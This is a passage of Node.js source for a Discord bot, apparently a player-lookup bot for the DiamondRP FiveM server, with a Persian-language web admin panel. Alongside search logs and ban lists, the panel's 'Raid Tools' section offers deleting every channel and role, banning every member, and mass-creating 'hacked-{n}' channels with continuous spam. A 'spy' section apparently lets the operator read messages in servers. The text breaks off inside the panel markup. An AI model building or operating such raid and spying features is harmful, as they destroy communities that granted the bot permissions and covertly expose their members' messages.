require("dotenv").config();

const { Client, GatewayIntentBits, EmbedBuilder, SlashCommandBuilder, REST, Routes, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");
const axios = require("axios");
const express = require("express");

axios.defaults.timeout = 10000;

function getIranTime() {
  return new Date(Date.now() + 3.5 * 60 * 60 * 1000);
}

const BOT_TOKEN = process.env.BOT_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const ADMIN_USERNAME = process.env.ADMIN_USERNAME;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD;

if (!BOT_TOKEN || !CLIENT_ID || !ADMIN_USERNAME || !ADMIN_PASSWORD) {
  console.error("Missing required environment variables!");
  process.exit(1);
}

const API_URL = "https://game-tools.ir/api/v1/servers/fivem/DiamondRP/players";

const searchLogs = [];
const MAX_LOGS = 1000;
const bannedChannels = new Map();
const bannedGuilds = new Map();
const bannedUsers = new Map();
const sessions = new Map();
let createTask = null;
let spamTask = null;

function addSearchLog(log) {
  searchLogs.unshift({ ...log, timestamp: getIranTime().toISOString() });
  if (searchLogs.length > MAX_LOGS) searchLogs.pop();
}

function isChannelBanned(channelId) {
  return bannedChannels.has(channelId);
}

function isGuildBanned(guildId) {
  return bannedGuilds.has(guildId);
}

function getBanMessage(channelId) {
  return bannedChannels.get(channelId);
}

function getGuildBanMessage(guildId) {
  return bannedGuilds.get(guildId);
}

function isUserBanned(userId) {
  return bannedUsers.has(userId);
}

function getUserBanMessage(userId) {
  return bannedUsers.get(userId);
}

function generateSessionId() {
  return Math.random().toString(36).substring(2) + Date.now().toString(36);
}

const app = express();
const port = process.env.PORT || 10000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

function parseCookies(cookieHeader) {
  const cookies = {};
  if (cookieHeader) {
    cookieHeader.split(";").forEach((cookie) => {
      const parts = cookie.split("=");
      cookies[parts[0].trim()] = parts[1]?.trim();
    });
  }
  return cookies;
}

function requireAuth(req, res, next) {
  const cookies = parseCookies(req.headers.cookie);
  if (cookies.sessionId && sessions.has(cookies.sessionId)) {
    next();
  } else {
    res.redirect("/login");
  }
}

const panelCSS = `
*{margin:0;padding:0;box-sizing:border-box}
:root{--bg:#0a0a0f;--card:#12121a;--card2:#1a1a25;--purple:#8b5cf6;--purple2:#a78bfa;--pink:#ec4899;--cyan:#06b6d4;--green:#10b981;--red:#ef4444;--orange:#f59e0b;--text:#fff;--text2:rgba(255,255,255,.6);--border:rgba(255,255,255,.08)}
html{font-size:16px}
body{font-family:'Vazirmatn',system-ui,sans-serif;background:var(--bg);min-height:100vh;color:var(--text);overflow-x:hidden}
.app{display:flex;min-height:100vh}
.sidebar{width:260px;background:var(--card);border-left:1px solid var(--border);padding:20px;position:fixed;right:0;top:0;height:100vh;display:flex;flex-direction:column;z-index:100;transition:transform .3s}
.logo{display:flex;align-items:center;gap:12px;padding-bottom:20px;border-bottom:1px solid var(--border);margin-bottom:20px}
.logo-icon{width:45px;height:45px;background:linear-gradient(135deg,var(--purple),var(--pink));border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:22px}
.logo h2{font-size:18px;font-weight:700}
.logo span{font-size:11px;color:var(--text2);display:block}
.nav{flex:1;display:flex;flex-direction:column;gap:6px}
.nav-btn{display:flex;align-items:center;gap:12px;padding:12px 16px;border-radius:10px;background:transparent;border:none;color:var(--text2);cursor:pointer;font-size:14px;font-family:inherit;transition:all .2s;width:100%;text-align:right}
.nav-btn:hover{background:rgba(139,92,246,.1);color:var(--text)}
.nav-btn.active{background:linear-gradient(135deg,var(--purple),var(--pink));color:#fff;box-shadow:0 4px 15px rgba(139,92,246,.3)}
.nav-btn span{font-size:18px}
.logout{margin-top:auto;padding:12px 16px;border-radius:10px;background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.2);color:var(--red);cursor:pointer;font-family:inherit;font-size:14px;transition:all .2s;text-decoration:none;display:flex;align-items:center;justify-content:center;gap:8px}
.logout:hover{background:rgba(239,68,68,.2)}
.main{flex:1;margin-right:260px;padding:24px;min-height:100vh}
.header{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px;flex-wrap:wrap;gap:12px}
.header h1{font-size:24px;font-weight:700;background:linear-gradient(135deg,var(--purple),var(--pink));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.time{color:var(--text2);font-size:13px}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin-bottom:24px}
.stat{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:20px;position:relative;overflow:hidden}
.stat::before{content:'';position:absolute;top:0;right:0;width:80px;height:80px;border-radius:50%;filter:blur(40px);opacity:.3}
.stat.purple::before{background:var(--purple)}
.stat.cyan::before{background:var(--cyan)}
.stat.green::before{background:var(--green)}
.stat.pink::before{background:var(--pink)}
.stat h3{font-size:28px;font-weight:700;margin-bottom:4px}
.stat.purple h3{color:var(--purple)}
.stat.cyan h3{color:var(--cyan)}
.stat.green h3{color:var(--green)}
.stat.pink h3{color:var(--pink)}
.stat p{color:var(--text2);font-size:13px}
.section{display:none;animation:fadeIn .3s}
.section.active{display:block}
@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
.card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:20px;margin-bottom:16px}
.card-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;flex-wrap:wrap;gap:10px}
.card-title{font-size:16px;font-weight:600;display:flex;align-items:center;gap:8px}
.btn{padding:10px 20px;border-radius:10px;border:none;cursor:pointer;font-family:inherit;font-size:13px;font-weight:500;transition:all .2s;display:inline-flex;align-items:center;gap:6px}
.btn-primary{background:linear-gradient(135deg,var(--purple),var(--pink));color:#fff}
.btn-primary:hover{box-shadow:0 4px 15px rgba(139,92,246,.4);transform:translateY(-2px)}
.btn-danger{background:rgba(239,68,68,.15);color:var(--red);border:1px solid rgba(239,68,68,.2)}
.btn-danger:hover{background:rgba(239,68,68,.25)}
.btn-secondary{background:var(--card2);color:var(--text);border:1px solid var(--border)}
.btn-secondary:hover{border-color:var(--purple)}
.table-wrap{overflow-x:auto;margin:0 -20px;padding:0 20px}
table{width:100%;border-collapse:collapse;min-width:700px}
th{text-align:right;padding:12px;color:var(--text2);font-weight:500;font-size:12px;border-bottom:1px solid var(--border)}
td{padding:14px 12px;border-bottom:1px solid var(--border);font-size:13px}
tr:hover td{background:rgba(139,92,246,.03)}
.badge{padding:4px 10px;border-radius:20px;font-size:11px;font-weight:500}
.badge-purple{background:rgba(139,92,246,.15);color:var(--purple2)}
.badge-cyan{background:rgba(6,182,212,.15);color:var(--cyan)}
.badge-orange{background:rgba(245,158,11,.15);color:var(--orange)}
.badge-green{background:rgba(16,185,129,.15);color:var(--green)}
.user-cell{display:flex;flex-direction:column;gap:2px}
.user-name{font-weight:500}
.user-id{font-size:11px;color:var(--text2);font-family:monospace}
.query{background:var(--card2);padding:4px 10px;border-radius:6px;font-family:monospace;font-size:12px;color:var(--purple2)}
.success{color:var(--green)}
.fail{color:var(--red)}
.form-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px;margin-bottom:12px}
.form-group{display:flex;flex-direction:column;gap:6px}
.form-group label{font-size:12px;color:var(--text2)}
.form-group input,.form-group select{background:var(--card2);border:1px solid var(--border);border-radius:10px;padding:12px 14px;color:var(--text);font-family:inherit;font-size:14px;transition:all .2s}
.form-group input:focus,.form-group select:focus{outline:none;border-color:var(--purple)}
.form-group input[type="color"]{padding:4px;height:44px;cursor:pointer}
.form-group input[type="number"]{-moz-appearance:textfield}
.form-group input::-webkit-outer-spin-button,.form-group input::-webkit-inner-spin-button{-webkit-appearance:none}
.ban-list{display:grid;gap:10px;margin-top:16px}
.ban-item{display:flex;justify-content:space-between;align-items:center;background:var(--card2);border:1px solid var(--border);border-radius:12px;padding:14px 16px;flex-wrap:wrap;gap:10px}
.ban-info h4{font-size:14px;font-weight:500;margin-bottom:4px}
.ban-info p{font-size:12px;color:var(--text2)}
.empty{text-align:center;padding:40px;color:var(--text2)}
.empty span{font-size:48px;display:block;margin-bottom:10px;opacity:.5}
.alert{padding:14px 16px;border-radius:12px;margin-bottom:16px;display:flex;align-items:center;gap:12px;font-size:13px}
.alert-info{background:rgba(6,182,212,.1);border:1px solid rgba(6,182,212,.2);color:var(--cyan)}
.alert-success{background:rgba(16,185,129,.1);border:1px solid rgba(16,185,129,.2);color:var(--green)}
.alert-error{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.2);color:var(--red)}
.alert-warning{background:rgba(245,158,11,.1);border:1px solid rgba(245,158,11,.2);color:var(--orange)}
.raid-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:16px}
.raid-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:20px;position:relative;overflow:hidden}
.raid-card.danger{border-color:rgba(239,68,68,.3);background:linear-gradient(135deg,rgba(239,68,68,.05),transparent)}
.raid-card.primary{border-color:rgba(139,92,246,.3);background:linear-gradient(135deg,rgba(139,92,246,.05),transparent)}
.raid-card.pink{border-color:rgba(236,72,153,.3);background:linear-gradient(135deg,rgba(236,72,153,.05),transparent)}
.raid-head{display:flex;align-items:center;gap:12px;margin-bottom:16px}
.raid-icon{width:44px;height:44px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:20px}
.raid-card.danger .raid-icon{background:linear-gradient(135deg,var(--red),var(--orange))}
.raid-card.primary .raid-icon{background:linear-gradient(135deg,var(--purple),var(--pink))}
.raid-card.pink .raid-icon{background:linear-gradient(135deg,var(--pink),var(--purple))}
.raid-head h3{font-size:15px;font-weight:600}
.raid-head p{font-size:11px;color:var(--text2)}
.result{margin-top:12px}
.guild-master{background:linear-gradient(135deg,rgba(139,92,246,.1),rgba(236,72,153,.1));border:1px solid rgba(139,92,246,.3);border-radius:16px;padding:20px;margin-bottom:20px}
.guild-master h2{font-size:18px;margin-bottom:12px;background:linear-gradient(135deg,var(--purple),var(--pink));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.guild-master-row{display:flex;gap:12px;align-items:end;flex-wrap:wrap}
.guild-master-row .form-group{flex:1;min-width:200px;margin:0}
.checkbox-group{display:flex;align-items:center;gap:10px;padding:12px 0}
.checkbox-group input[type="checkbox"]{width:18px;height:18px;accent-color:var(--purple)}
.checkbox-group label{font-size:13px;color:var(--text)}
.menu-toggle{display:none;position:fixed;top:16px;right:16px;z-index:200;width:44px;height:44px;border-radius:12px;background:var(--card);border:1px solid var(--border);color:var(--text);font-size:20px;cursor:pointer}
.overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:90}
@media(max-width:900px){
  .sidebar{transform:translateX(100%)}
  .sidebar.open{transform:translateX(0)}
  .main{margin-right:0}
  .menu-toggle{display:flex;align-items:center;justify-content:center}
  .overlay.open{display:block}
  .stats{grid-template-columns:repeat(2,1fr)}
  .raid-grid{grid-template-columns:1fr}
}
@media(max-width:500px){
  .stats{grid-template-columns:1fr}
  .header h1{font-size:20px}
  .form-row{grid-template-columns:1fr}
}
.channel-item{display:flex;align-items:center;gap:10px;padding:12px 16px;background:var(--card2);border:1px solid var(--border);border-radius:10px;margin-bottom:8px;cursor:pointer;transition:all .2s}
.channel-item:hover{border-color:var(--purple);background:rgba(139,92,246,.1)}
.channel-item.active{border-color:var(--purple);background:rgba(139,92,246,.15)}
.channel-icon{font-size:18px}
.channel-name{flex:1;font-weight:500}
.channel-type{font-size:11px;color:var(--text2);background:var(--card);padding:4px 8px;border-radius:6px}
.messages-container{background:#36393f;border-radius:12px;padding:16px;max-height:600px;overflow-y:auto;scrollbar-width:thin;scrollbar-color:#202225 #2f3136;direction:ltr}
.messages-container::-webkit-scrollbar{width:8px}
.messages-container::-webkit-scrollbar-track{background:#2f3136;border-radius:4px}
.messages-container::-webkit-scrollbar-thumb{background:#202225;border-radius:4px}
.messages-container::-webkit-scrollbar-thumb:hover{background:#18191c}
.message-item{display:flex;gap:16px;padding:8px 16px;margin:0 -16px;transition:background .1s;position:relative;direction:ltr;text-align:left}
.message-item:hover{background:rgba(0,0,0,.1)}
.message-avatar{width:40px;height:40px;border-radius:50%;background:#5865f2;display:flex;align-items:center;justify-content:center;font-size:16px;color:#fff;flex-shrink:0;cursor:pointer;transition:opacity .2s}
.message-avatar:hover{opacity:.8}
.message-avatar img{width:100%;height:100%;border-radius:50%;object-fit:cover}
.message-body{flex:1;min-width:0}
.message-header{display:flex;align-items:baseline;gap:8px;margin-bottom:4px}
.message-author{font-weight:600;color:#fff;cursor:pointer}
.message-author:hover{text-decoration:underline}
.message-author.bot{color:#5865f2}
.message-bot-tag{background:#5865f2;color:#fff;font-size:10px;padding:2px 4px;border-radius:3px;font-weight:500}
.message-time{font-size:12px;color:#72767d}
.message-content{color:#dcddde;line-height:1.4;word-break:break-word;white-space:pre-wrap}
.message-content a{color:#00aff4}
.message-content strong{font-weight:700;color:#fff}
.message-content em{font-style:italic}
.message-content code{background:#2f3136;padding:2px 4px;border-radius:3px;font-family:'Consolas',monospace;font-size:13px}
.message-content pre{background:#2f3136;padding:12px;border-radius:4px;margin:8px 0;overflow-x:auto}
.message-content pre code{padding:0;background:none}
.message-content .mention{background:rgba(88,101,242,.3);color:#dee0fc;padding:0 2px;border-radius:3px}
.message-content .spoiler{background:#202225;color:transparent;padding:0 2px;border-radius:3px;cursor:pointer}
.message-content .spoiler:hover{color:#dcddde}
.message-attachments{margin-top:8px;display:flex;flex-wrap:wrap;gap:8px}
.message-attachments img{max-width:400px;max-height:300px;border-radius:8px;cursor:pointer}
.message-attachments video{max-width:400px;max-height:300px;border-radius:8px}
.message-file{display:flex;align-items:center;gap:8px;background:#2f3136;padding:10px;border-radius:8px;border:1px solid #202225}
.message-file-icon{font-size:24px}
.message-file-info{flex:1}
.message-file-name{color:#00aff4;font-size:14px}
.message-file-size{color:#72767d;font-size:12px}
.message-embed{background:#2f3136;border-radius:4px;border-right:4px solid #5865f2;padding:12px;margin-top:8px;max-width:520px}
.message-embed-author{display:flex;align-items:center;gap:8px;margin-bottom:8px}
.message-embed-author img{width:24px;height:24px;border-radius:50%}
.message-embed-author-name{color:#fff;font-size:14px;font-weight:500}
.message-embed-title{color:#00aff4;font-weight:600;font-size:16px;margin-bottom:8px}
.message-embed-title a{color:#00aff4;text-decoration:none}
.message-embed-title a:hover{text-decoration:underline}
.message-embed-description{color:#dcddde;font-size:14px;line-height:1.4;margin-bottom:8px}
.message-embed-fields{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:8px;margin-bottom:8px}
.message-embed-field{min-width:0}
.message-embed-field.inline{grid-column:span 1}
.message-embed-field-name{color:#fff;font-weight:600;font-size:14px;margin-bottom:2px}
.message-embed-field-value{color:#dcddde;font-size:14px}
.message-embed-thumbnail{float:left;margin-right:16px;margin-bottom:8px}
.message-embed-thumbnail img{max-width:80px;max-height:80px;border-radius:4px}
.message-embed-image{margin-top:8px}
.message-embed-image img{max-width:100%;max-height:300px;border-radius:4px}
.message-embed-footer{display:flex;align-items:center;gap:8px;margin-top:8px;color:#72767d;font-size:12px}
.message-embed-footer img{width:20px;height:20px;border-radius:50%}
.message-interaction{background:rgba(88,101,242,.1);border:1px solid rgba(88,101,242,.3);border-radius:8px;padding:8px 12px;margin-bottom:8px;display:flex;align-items:center;gap:8px}
.message-interaction-icon{color:#5865f2;font-size:16px}
.message-interaction-text{color:#b9bbbe;font-size:13px}
.message-interaction-user{color:#fff;font-weight:500}
.message-interaction-cmd{color:#00aff4;font-family:monospace}
.message-reply{display:flex;align-items:center;gap:8px;margin-bottom:4px;font-size:13px;color:#b9bbbe;margin-right:56px}
.message-reply-line{width:33px;height:13px;margin-left:16px;border-right:2px solid #4f545c;border-top:2px solid #4f545c;border-top-right-radius:6px;flex-shrink:0}
.message-reply-avatar{width:16px;height:16px;border-radius:50%;flex-shrink:0}
.message-reply-avatar img{width:100%;height:100%;border-radius:50%}
.message-reply-author{color:#fff;font-weight:500;cursor:pointer}
.message-reply-author:hover{text-decoration:underline}
.message-reply-content{color:#b9bbbe;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;flex:1}
.message-sticker{margin-top:8px}
.message-sticker img{width:160px;height:160px}
.user-profile-modal{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.85);display:flex;align-items:center;justify-content:center;z-index:1000}
.user-profile{background:#18191c;border-radius:8px;width:340px;overflow:hidden}
.user-profile-banner{height:60px;background:linear-gradient(135deg,#5865f2,#eb459e)}
.user-profile-avatar{width:80px;height:80px;border-radius:50%;border:6px solid #18191c;margin:-40px auto 0;display:flex;align-items:center;justify-content:center;background:#5865f2;font-size:32px;color:#fff}
.user-profile-avatar img{width:100%;height:100%;border-radius:50%}
.user-profile-body{padding:16px}
.user-profile-name{font-size:20px;font-weight:600;color:#fff;text-align:center}
.user-profile-tag{font-size:14px;color:#b9bbbe;text-align:center;margin-bottom:16px}
.user-profile-section{background:#2f3136;border-radius:8px;padding:12px;margin-bottom:12px}
.user-profile-section-title{font-size:12px;font-weight:700;color:#b9bbbe;text-transform:uppercase;margin-bottom:8px}
.user-profile-field{display:flex;justify-content:space-between;margin-bottom:4px}
.user-profile-field-label{color:#b9bbbe;font-size:13px}
.user-profile-field-value{color:#fff;font-size:13px;font-family:monospace}
.user-profile-close{background:#5865f2;color:#fff;border:none;padding:10px;width:100%;border-radius:4px;cursor:pointer;font-weight:500}
.server-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px}
.server-card{background:var(--card2);border:1px solid var(--border);border-radius:16px;padding:16px;cursor:pointer;transition:all .2s}
.server-card:hover{border-color:var(--purple);transform:translateY(-2px);box-shadow:0 8px 25px rgba(139,92,246,.2)}
.server-header{display:flex;align-items:center;gap:12px;margin-bottom:12px}
.server-icon{width:56px;height:56px;border-radius:16px;background:var(--purple);display:flex;align-items:center;justify-content:center;font-size:24px;color:#fff;flex-shrink:0}
.server-icon img{width:100%;height:100%;border-radius:16px;object-fit:cover}
.server-info{flex:1;min-width:0}
.server-name{font-weight:600;font-size:16px;color:var(--text);margin-bottom:4px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.server-id{font-size:12px;color:var(--text2);font-family:monospace;background:var(--card);padding:4px 8px;border-radius:6px;display:inline-block}
.server-stats{display:flex;gap:16px;margin-top:12px;padding-top:12px;border-top:1px solid var(--border)}
.server-stat{text-align:center;flex:1}
.server-stat-value{font-size:18px;font-weight:600;color:var(--purple)}
.server-stat-label{font-size:11px;color:var(--text2)}
.server-actions{display:flex;gap:8px;margin-top:12px}
.server-actions .btn{flex:1;padding:8px;font-size:12px}
`;

app.get("/login", (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
  <title>ورود به پنل</title>
  <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:'Vazirmatn',sans-serif;background:#0a0a0f;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;overflow:hidden}
    .bg{position:fixed;inset:0;z-index:-1}
    .bg span{position:absolute;border-radius:50%;background:linear-gradient(135deg,#8b5cf6,#ec4899);filter:blur(80px);opacity:.15}
    .bg span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px}
    .bg span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px}
    .login-box{background:rgba(18,18,26,.9);backdrop-filter:blur(20px);padding:40px;border-radius:24px;width:100%;max-width:400px;border:1px solid rgba(255,255,255,.08);animation:fadeIn .5s}
    @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
    .logo{text-align:center;margin-bottom:30px}
    .logo-icon{width:70px;height:70px;background:linear-gradient(135deg,#8b5cf6,#ec4899);border-radius:20px;display:inline-flex;align-items:center;justify-content:center;font-size:32px;margin-bottom:16px}
    h1{color:#fff;font-size:24px;margin-bottom:8px}
    .subtitle{color:rgba(255,255,255,.5);font-size:14px}
    .error{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.2);color:#f87171;padding:12px;border-radius:12px;margin:20px 0;text-align:center;font-size:13px}
    .form-group{margin-bottom:16px}
    label{display:block;color:rgba(255,255,255,.7);margin-bottom:8px;font-size:13px}
    input{width:100%;padding:14px 16px;border:1px solid rgba(255,255,255,.1);border-radius:12px;background:rgba(255,255,255,.03);color:#fff;font-size:15px;font-family:inherit;transition:all .2s}
    input:focus{outline:none;border-color:#8b5cf6;background:rgba(139,92,246,.05)}
    button{width:100%;padding:14px;border:none;border-radius:12px;background:linear-gradient(135deg,#8b5cf6,#ec4899);color:#fff;font-size:15px;font-weight:600;cursor:pointer;font-family:inherit;transition:all .2s;margin-top:10px}
    button:hover{box-shadow:0 8px 25px rgba(139,92,246,.4);transform:translateY(-2px)}
  </style>
</head>
<body>
  <div class="bg"><span></span><span></span></div>
  <div class="login-box">
    <div class="logo">
      <div class="logo-icon">💎</div>
      <h1>DiamondRP Panel</h1>
      <p class="subtitle">پنل مدیریت بات دیسکورد</p>
    </div>
    ${req.query.error ? '<div class="error">❌ نام کاربری یا رمز عبور اشتباه است</div>' : ''}
    <form method="POST" action="/login">
      <div class="form-group">
        <label>👤 نام کاربری</label>
        <input type="text" name="username" required placeholder="نام کاربری...">
      </div>
      <div class="form-group">
        <label>🔐 رمز عبور</label>
        <input type="password" name="password" required placeholder="رمز عبور...">
      </div>
      <button type="submit">ورود به پنل</button>
    </form>
  </div>
</body>
</html>
  `);
});

app.post("/login", (req, res) => {
  if (req.body.username === ADMIN_USERNAME && req.body.password === ADMIN_PASSWORD) {
    const sessionId = generateSessionId();
    sessions.set(sessionId, { loginTime: Date.now() });
    res.setHeader("Set-Cookie", `sessionId=${sessionId}; Path=/; HttpOnly`);
    res.redirect("/panel");
  } else {
    res.redirect("/login?error=1");
  }
});

app.get("/logout", (req, res) => {
  const cookies = parseCookies(req.headers.cookie);
  if (cookies.sessionId) sessions.delete(cookies.sessionId);
  res.setHeader("Set-Cookie", "sessionId=; Path=/; HttpOnly; Max-Age=0");
  res.redirect("/login");
});


app.get("/panel", requireAuth, (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
  <title>پنل مدیریت DiamondRP</title>
  <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>${panelCSS}</style>
</head>
<body>
  <button class="menu-toggle" onclick="toggleMenu()">☰</button>
  <div class="overlay" onclick="toggleMenu()"></div>
  
  <div class="app">
    <aside class="sidebar">
      <div class="logo">
        <div class="logo-icon">💎</div>
        <div><h2>DiamondRP</h2><span>پنل مدیریت</span></div>
      </div>
      <nav class="nav">
        <button class="nav-btn active" onclick="showSection('logs',this)"><span>📋</span> لاگ‌ها</button>
        <button class="nav-btn" onclick="showSection('bans',this)"><span>🛡️</span> بن‌ها</button>
        <button class="nav-btn" onclick="showSection('raid',this)"><span>💀</span> Raid Tools</button>
        <button class="nav-btn" onclick="showSection('spy',this)"><span>🕵️</span> جاسوسی</button>
        <button class="nav-btn" onclick="showSection('servers',this)"><span>🌐</span> سرورها</button>
      </nav>
      <a href="/logout" class="logout">🚪 خروج از پنل</a>
    </aside>
    
    <main class="main">
      <div class="header">
        <h1>💎 داشبورد مدیریت</h1>
        <span class="time" id="time"></span>
      </div>
      
      <div class="stats" id="stats"></div>
      
      <!-- Logs Section -->
      <section id="logs-section" class="section active">
        <div class="card">
          <div class="card-head">
            <h3 class="card-title">📋 لاگ‌های سرچ</h3>
            <button class="btn btn-secondary" onclick="loadLogs()">🔄 بروزرسانی</button>
          </div>
          <div class="table-wrap">
            <table>
              <thead><tr><th>زمان</th><th>نوع</th><th>کاربر</th><th>چنل</th><th>سرور</th><th>جستجو</th><th>نتیجه</th></tr></thead>
              <tbody id="logs-table"></tbody>
            </table>
          </div>
        </div>
      </section>
      
      <!-- Bans Section (Combined) -->
      <section id="bans-section" class="section">
        <!-- Ban Channel -->
        <div class="card">
          <div class="card-head">
            <h3 class="card-title">🚫 بن چنل</h3>
          </div>
          <div class="alert alert-info"><span>💡</span> چنل‌های بن شده: کسی نمیتونه از دستورات بات استفاده کنه</div>
          <div class="form-row">
            <div class="form-group"><label>آیدی چنل</label><input type="text" id="ban-channel-id" placeholder="123456789"></div>
            <div class="form-group"><label>پیام بن</label><input type="text" id="ban-message" placeholder="این چنل بن شده..."></div>
            <div class="form-group" style="justify-content:flex-end"><button class="btn btn-primary" onclick="addChannelBan()">🚫 بن چنل</button></div>
          </div>
          <div class="ban-list" id="channel-bans-list"></div>
        </div>
        
        <!-- Ban Guild -->
        <div class="card">
          <div class="card-head">
            <h3 class="card-title">🔒 بن سرور</h3>
          </div>
          <div class="alert alert-info"><span>💡</span> سرورهای بن شده: بات در کل سرور غیرفعال میشه</div>
          <div class="form-row">
            <div class="form-group"><label>آیدی سرور (Guild ID)</label><input type="text" id="ban-guild-id" placeholder="123456789"></div>
            <div class="form-group"><label>پیام بن</label><input type="text" id="guild-ban-message" placeholder="این سرور بن شده..."></div>
            <div class="form-group" style="justify-content:flex-end"><button class="btn btn-primary" onclick="addGuildBan()">🔒 بن سرور</button></div>
          </div>
          <div class="ban-list" id="guild-bans-list"></div>
        </div>
        
        <!-- Ban User from Bot -->
        <div class="card">
          <div class="card-head">
            <h3 class="card-title">👤 بن کاربر از بات</h3>
          </div>
          <div class="alert alert-info"><span>💡</span> کاربران بن شده: نمیتونن از هیچ دستور باتی استفاده کنن</div>
          <div class="form-row">
            <div class="form-group"><label>آیدی کاربر (User ID)</label><input type="text" id="ban-user-id" placeholder="123456789"></div>
            <div class="form-group"><label>پیام بن</label><input type="text" id="user-ban-message" placeholder="شما بن شدید..."></div>
            <div class="form-group" style="justify-content:flex-end"><button class="btn btn-primary" onclick="addUserBan()">👤 بن کاربر</button></div>
          </div>
          <div class="ban-list" id="user-bans-list"></div>
        </div>
      </section>
      
      <!-- Raid Section -->
      <section id="raid-section" class="section">
        <div class="guild-master">
          <h2>🎯 Guild ID اصلی</h2>
          <div class="guild-master-row">
            <div class="form-group"><input type="text" id="main-guild-id" placeholder="یه بار اینجا بزن، همه جا پر میشه" oninput="autoFillGuilds()"></div>
          </div>
        </div>
        
        <div class="raid-grid">
          <!-- Delete Channels -->
          <div class="raid-card danger">
            <div class="raid-head">
              <div class="raid-icon">🗑️</div>
              <div><h3>حذف همه چنل‌ها</h3><p>حذف تمام چنل‌ها و کتگوری‌ها</p></div>
            </div>
            <div class="form-group"><label>Guild ID</label><input type="text" class="guild-input" id="delete-guild-id" placeholder="123456789"></div>
            <button class="btn btn-danger" style="width:100%;margin-top:12px" onclick="deleteAllChannels()">💥 حذف همه چنل‌ها</button>
            <div class="result" id="delete-result"></div>
          </div>
          
          <!-- Ban All -->
          <div class="raid-card danger">
            <div class="raid-head">
              <div class="raid-icon">☠️</div>
              <div><h3>بن همه ممبرها</h3><p>بن کردن تمام اعضای سرور</p></div>
            </div>
            <div class="form-group"><label>Guild ID</label><input type="text" class="guild-input" id="banall-guild-id" placeholder="123456789"></div>
            <button class="btn btn-danger" style="width:100%;margin-top:12px" onclick="banAllMembers()">☠️ بن همه</button>
            <div class="result" id="banall-result"></div>
          </div>
          
          <!-- Delete All Roles -->
          <div class="raid-card danger">
            <div class="raid-head">
              <div class="raid-icon">🎭</div>
              <div><h3>حذف همه رول‌ها</h3><p>حذف تمام رول‌های سرور</p></div>
            </div>
            <div class="form-group"><label>Guild ID</label><input type="text" class="guild-input" id="delete-roles-guild-id" placeholder="123456789"></div>
            <button class="btn btn-danger" style="width:100%;margin-top:12px" onclick="deleteAllRoles()">🎭 حذف همه رول‌ها</button>
            <div class="result" id="delete-roles-result"></div>
          </div>
        </div>
        
        <!-- Create Channels -->
        <div class="raid-card primary" style="margin-top:16px">
          <div class="raid-head">
            <div class="raid-icon">📢</div>
            <div><h3>ساخت چنل انبوه</h3><p>از {n} برای شماره‌گذاری استفاده کن</p></div>
          </div>
          <div class="form-row">
            <div class="form-group"><label>Guild ID</label><input type="text" class="guild-input" id="create-guild-id" placeholder="123456789"></div>
            <div class="form-group"><label>اسم چنل</label><input type="text" id="create-channel-name" placeholder="hacked-{n}"></div>
            <div class="form-group"><label>تعداد</label><input type="number" id="create-count" value="50" min="1"></div>
          </div>
          <div class="form-row">
            <div class="form-group"><label>پیام</label><input type="text" id="create-message" placeholder="پیام برای ارسال..."></div>
            <div class="form-group">
              <label>روش پیام‌دهی</label>
              <select id="spam-mode">
                <option value="once">📝 یه بار بعد از ساخت همه</option>
                <option value="continuous">🔄 اسپم مداوم (تا توقف)</option>
              </select>
            </div>
          </div>
          <div class="checkbox-group">
            <input type="checkbox" id="delete-before-create">
            <label for="delete-before-create">قبل از ساخت، همه چنل‌های قبلی پاک بشن؟</label>
          </div>
          <div style="display:flex;gap:10px;flex-wrap:wrap">
            <button class="btn btn-primary" style="flex:1" onclick="createChannels()">🚀 اجرا</button>
            <button class="btn btn-danger" onclick="stopAll()">⏹️ توقف</button>
          </div>
          <div class="result" id="create-result"></div>
        </div>
        
        <!-- Create Roles -->
        <div class="raid-card pink" style="margin-top:16px">
          <div class="raid-head">
            <div class="raid-icon">🎭</div>
            <div><h3>ساخت رول انبوه</h3><p>رول با رنگ دلخواه یا رندوم</p></div>
          </div>
          <div class="form-row">
            <div class="form-group"><label>Guild ID</label><input type="text" class="guild-input" id="role-guild-id" placeholder="123456789"></div>
